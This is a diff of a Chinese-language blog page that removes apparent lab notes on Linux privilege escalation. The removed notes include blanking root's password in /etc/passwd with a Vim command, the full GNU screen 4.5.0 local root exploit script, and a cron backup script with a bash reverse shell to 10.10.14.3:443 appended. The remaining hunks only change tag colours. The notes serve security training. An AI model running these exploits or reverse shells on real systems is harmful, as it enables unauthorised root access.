-<p>：是 Vim 的选项之一，它表示启动 Vim 编辑器并进入批处理模式。</p>
-<ul>
-<li><code>-e</code>：表示以 Ex 模式启动 Vim，该模式是 Vim 的批处理编辑模式，不显示交互式界面。</li>
-<li><code>-s</code>：表示将 Vim 当作脚本执行。这个选项需要与 <code>-e</code> 一起使用，将 Vim 用于自动化编辑任务和批量处理。</li>
-</ul>
-</li>
-</ul>
-<p>使用 <code>vim -es</code> 后，可以通过标准输入或文件输入来执行编辑操作或脚本。例如，可以通过输入 Ex 命令来编辑文件、搜索和替换文本等，然后退出 Vim。</p>
-</blockquote>
-<p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p>
-<blockquote>
-<p>在 Linux 系统中，<code>/etc/passwd</code> 文件中的每一行描述一个用户账号的信息，以冒号分隔字段。其中，<code>root:x:0:0:root:/root:/bin/bash</code> 这一行表示 <code>root</code> 用户的账号信息。</p>
-<ul>
-<li>第一个字段 <code>root</code> 是用户名，表示账号的登录名。</li>
-<li>第二个字段 <code>x</code> 是密码字段。在过去，密码是以明文存储在 <code>/etc/passwd</code> 文件中，但为了增加安全性，现代系统一般将密码存储在 <code>/etc/shadow</code> 文件中，而在 <code>/etc/passwd</code> 文件中用 <code>x</code> 占位。真正的密码哈希值存储在 <code>/etc/shadow</code> 文件中，只有超级用户（通常是 <code>root</code> 用户）可以访问该文件。</li>
-<li>第三个字段 <code>0</code> 是用户ID（UID，User ID）。<code>0</code> 表示 <code>root</code> 用户的用户ID，<code>0</code> 是预留给超级用户（root）的特殊用户ID。</li>
-<li>第四个字段 <code>0</code> 是组ID（GID，Group ID）。同样，<code>0</code> 表示 <code>root</code> 用户所属的组ID，即预留给超级用户组的特殊组ID。</li>
-<li>第五个字段 <code>root</code> 是用户的全名或注释字段，通常是对用户的描述。</li>
-<li>第六个字段 <code>/root</code> 是用户的主目录，即 <code>root</code> 用户的家目录。</li>
-<li>第七个字段 <code>/bin/bash</code> 是用户登录后使用的默认 shell。</li>
-</ul>
-<p>在现代系统中，密码字段中的 <code>x</code> 表示密码信息存储在 <code>/etc/shadow</code> 文件中，因此 <code>/etc/passwd</code> 中并不包含实际的密码信息。这样可以增加系统的安全性，因为只有超级用户才能访问 <code>/etc/shadow</code> 文件，一般用户无法获取到真正的密码哈希值。</p>
-</blockquote>
-<p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p>
-<h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>Escalate the privileges using capabilities and read the flag.txt file in the “&#x2F;root” directory. Submit its contents as the answer.</strong></p>
-<p>这里跟上面的示例差不多，唯一的区别是在修改passwd文件时需要使用wq！退出才能有效</p>
-<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307161934479.png" alt="image-20230716193413383"></p>
-<blockquote>
-<p>在 Vim 中，<code>:wq!</code> 和 <code>:wq</code> 是两个不同的命令，分别用于保存文件并退出 Vim。</p>
-<ol>
-<li><code>:wq!</code>：这个命令用于保存文件并强制退出 Vim。如果当前编辑的文件没有写权限或者是只读文件，或者 Vim 检测到文件已被修改但未保存，<code>:wq!</code> 命令会强制保存文件并退出编辑器。如果文件是只读的，会提示是否保存为另一个文件。</li>
-<li><code>:wq</code>：这个命令用于保存文件并退出 Vim。如果当前编辑的文件有写权限且没有被其他程序锁定，并且没有未保存的修改，<code>:wq</code> 命令会保存文件并退出编辑器。如果文件是只读的或者有未保存的修改，Vim 会给出相应的提示并不会退出编辑器。</li>
-</ol>
-<p>在 Vim 中，冒号 <code>:</code> 是用于输入命令的前缀符号。要使用上述命令，需要按下 Esc 键以确保退出插入模式，然后在 Normal 模式下输入 <code>:wq!</code> 或 <code>:wq</code>，然后按 Enter 键执行相应的命令。</p>
-<p>综上所述，<code>wq!</code> 和 <code>wq</code> 在功能上的区别主要是 <code>!</code> 的作用，用于强制执行保存操作。</p>
-</blockquote>
-<p>这里再解释一下：</p>
-<blockquote>
-<p><code>:%s/^root:[^:]*:/root::/</code> 是 Vim 编辑器的替换命令，用于在编辑器中对文本进行查找和替换操作。解析如下：</p>
-<ul>
-<li><p><code>:</code>：冒号是进入 Vim 的命令行模式的前缀符号。</p>
-</li>
-<li><p><code>%</code>：在 Vim 中 <code>%</code> 表示全局范围，用于指定查找和替换操作在整个文件中执行。</p>
-</li>
-<li><p><code>s</code>：<code>s</code> 是替换命令的简写，用于执行查找和替换操作。</p>
-</li>
-<li><pre><code>/^root:[^:]*:/
-</code></pre>
-<p>：这是查找模式，用于匹配以 </p>
-<pre><code>root:
-</code></pre>
-<p> 开头的文本。解析如下：</p>
-<ul>
-<li><code>^</code>：表示匹配行的开头。</li>
-<li><code>root:</code>：表示要匹配的文本以 <code>root:</code> 开头。</li>
-<li><code>[^:]*</code>：表示匹配零个或多个非冒号字符，即匹配 <code>root:</code> 后的用户名。</li>
-<li><code>:</code>：表示匹配冒号。</li>
-</ul>
-</li>
-<li><pre><code>/root::/
-</code></pre>
-<p>：这是替换模式，用于将匹配的文本替换为 </p>
-<pre><code>root::
-</code></pre>
-<p>。解析如下：</p>
-<ul>
-<li><code>root::</code>：表示要替换的文本为 <code>root::</code>，即清空密码字段。</li>
-</ul>
-</li>
-</ul>
-</blockquote>
-<h1 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h1><h4 id="Screen-Version-Identification"><a href="#Screen-Version-Identification" class="headerlink" title="Screen Version Identification"></a>Screen Version Identification</h4><pre><code class="shell-session">Tanin@htb[/htb]$ screen -v
-
-Screen version 4.05.00 (GNU) 10-Dec-16
-</code></pre>
-<p>4.5.0版本存在权限提升漏洞，原因是打开日志文件时缺少权限检查。</p>
-<p>这使攻击者能够截断任何文件或在任何目录中创建root拥有的文件，并最终获得完全的root访问权限。</p>
-<h4 id="Privilege-Escalation-Screen-Exploit-sh"><a href="#Privilege-Escalation-Screen-Exploit-sh" class="headerlink" title="Privilege Escalation - Screen_Exploit.sh"></a>Privilege Escalation - Screen_Exploit.sh</h4><pre><code class="bash">#!/bin/bash
-# screenroot.sh
-# setuid screen v4.5.0 local root exploit
-# abuses ld.so.preload overwriting to get root.
-# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
-# HACK THE PLANET
-# ~ infodox (25/1/2017)
-echo &quot;~ gnu/screenroot ~&quot;
-echo &quot;[+] First, we create our shell and library...&quot;
-cat &lt;&lt; EOF &gt; /tmp/libhax.c
-#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/stat.h&gt;
-__attribute__ ((__constructor__))
-void dropshell(void)&#123;
-    chown(&quot;/tmp/rootshell&quot;, 0, 0);
-    chmod(&quot;/tmp/rootshell&quot;, 04755);
-    unlink(&quot;/etc/ld.so.preload&quot;);
-    printf(&quot;[+] done!\n&quot;);
-&#125;
-EOF
-gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
-rm -f /tmp/libhax.c
-cat &lt;&lt; EOF &gt; /tmp/rootshell.c
-#include &lt;stdio.h&gt;
-int main(void)&#123;
-    setuid(0);
-    setgid(0);
-    seteuid(0);
-    setegid(0);
-    execvp(&quot;/bin/sh&quot;, NULL, NULL);
-&#125;
-EOF
-gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
-rm -f /tmp/rootshell.c
-echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
-cd /etc
-umask 000 # because
-screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
-echo &quot;[+] Triggering...&quot;
-screen -ls # screen itself is setuid, so...
-/tmp/rootshell
-</code></pre>
-<h1 id="Cron-Job-Abuse"><a href="#Cron-Job-Abuse" class="headerlink" title="Cron Job Abuse"></a>Cron Job Abuse</h1><p>Cron作业也可以设置为一次性运行（例如在启动时）。它们通常用于管理任务，如运行备份、清理目录等。crontab命令可以创建一个cron文件，该文件将由cron守护进程按照指定的时间表运行。创建cron文件时，将在&#x2F;var&#x2F;spool&#x2F;cron中为创建该文件的特定用户创建该文件。crontab文件中的每个条目都需要六个项目，顺序如下：分钟、小时、天、月、周、命令。例如，条目0*&#x2F;12***&#x2F;home&#x2F;admin&#x2F;backup.sh将每12小时运行一次。 root crontab几乎总是只能由root用户或具有完全sudo权限的用户编辑；然而，它仍然可以被滥用。您可能会找到一个以root身份运行的可写脚本，即使您无法读取crontab以了解确切的时间表，您也可以确定它的运行频率（即，每12小时创建一个.tar.gz文件的备份脚本）。在这种情况下，您可以将一个命令附加到脚本的末尾（例如反向shell一行），它将在下次运行cron作业时执行。</p>
-<p>某些应用程序在&#x2F;etc&#x2F;cron.d目录中创建cron文件，并且可能被错误配置为允许非root用户编辑这些文件。 首先，让我们在系统中查找任何可写文件或目录。&#x2F;dmz backups目录中的文件backup.sh很有趣，看起来它可能运行在cron作业上。</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null
-
-/etc/cron.daily/backup
-/dmz-backups/backup.sh
-/proc
-/sys/fs/cgroup/memory/init.scope/cgroup.event_control
-
-&lt;SNIP&gt;
-/home/backupsvc/backup.sh
-
-&lt;SNIP&gt;
-</code></pre>
-<p>在&#x2F;dmz&#x2F;backups目录中快速查看一下，会显示每三分钟创建一次的文件。这似乎是一个重大的错误配置。也许sysadmin的意思是指定每三个小时一次，比如0*&#x2F;3<strong><em>，但写的是</em>&#x2F;3</strong>**，它告诉cron作业每三分钟运行一次。第二个问题是backup.sh shell脚本是全局可写的，并且以root身份运行。</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /dmz-backups/
-
-total 36
-drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
-drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
--rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
-</code></pre>
-<p>我们可以使用<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy</a>确认cron作业正在运行，pspy是一种命令行工具，用于查看正在运行的进程，而不需要root权限。我们可以使用它来查看其他用户运行的命令、cron作业等。它通过扫描procfs来工作。 让我们运行pspy并看看。-pf标志告诉工具打印命令和文件系统事件，-i 1000告诉它每隔1000毫秒（或每秒）扫描一次 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Procfs">procfs</a>。</p>
-<pre><code class="shell-session">Tanin@htb[/htb]$ ./pspy64 -pf -i 1000
-
-pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-</code></pre>
-<pre><code class="shell-session">Tanin@htb[/htb]$ cat /dmz-backups/backup.sh 
-
-#!/bin/bash
- SRCDIR=&quot;/var/www/html&quot;
- DESTDIR=&quot;/dmz-backups/&quot;
- FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
- tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
-</code></pre>
-<p>我们可以看到，脚本只是将源目录和目标目录作为变量。然后，它指定一个带有当前备份日期和时间的文件名，并创建源目录（web根目录）的tarball。让我们修改这个脚本，添加一个Bash单行反向shell。</p>
-<pre><code class="bash">#!/bin/bash
-SRCDIR=&quot;/var/www/html&quot;
-DESTDIR=&quot;/dmz-backups/&quot;
-FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
-tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
- 
-bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
-</code></pre>
-<blockquote>
-<ul>
-<li><code>bash -i</code>：启动一个交互式的 Bash shell，<code>-i</code> 表示进入交互模式。</li>
-<li><code>&gt;&amp;</code>：将标准输出和标准错误输出合并为一个输出流。</li>
-<li><code>/dev/tcp/10.10.14.3/443</code>：这是特殊的 Bash 设备文件，表示将数据发送到指定的 IP 地址和端口。在这里，它指定将输出流发送到 IP 地址为 <code>10.10.14.3</code> 的主机的 443 端口。</li>
-<li><code>0&gt;&amp;1</code>：将标准输入重定向到与标准输出合并的输出流，实现双向通信。</li>
-</ul>
-</blockquote>
-
+            
             
         </div>
     </div>
@@ -835,7 +285,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#00bcd4>
                 base
             </a>
         </span>
@@ -886,7 +336,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#00bcd4>
                 base
             </a>
         </span>
@@ -944,7 +394,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/tool" style=color:#00bcd4>
+            <a href="/tags/tool" style=color:#00a596>
                 tool
             </a>
         </span>
@@ -995,14 +445,14 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ffa2c4>
+            <a href="/tags/base" style=color:#ff7d73>
                 base
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/tool" style=color:#00bcd4>
+            <a href="/tags/tool" style=color:#ffa2c4>
                 tool
             </a>
         </span>
@@ -1053,14 +503,14 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#00bcd4>
                 base
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/tool" style=color:#03a9f4>
+            <a href="/tags/tool" style=color:#00a596>
                 tool
             </a>
         </span>
@@ -1111,7 +561,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#00a596>
+            <a href="/tags/base" style=color:#ff7d73>
                 base
             </a>
         </span>
@@ -1169,7 +619,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#ff7d73>
+            <a href="/tags/base" style=color:#ffa2c4>
                 base
             </a>
         </span>
@@ -1220,7 +670,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#00bcd4>
+            <a href="/tags/base" style=color:#03a9f4>
                 base
             </a>
         </span>
@@ -1271,7 +721,7 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1
         
         <span class="tag">
             
-            <a href="/tags/base" style=color:#00a596>
+            <a href="/tags/base" style=color:#00bcd4>
                 base
             </a>
         </span>
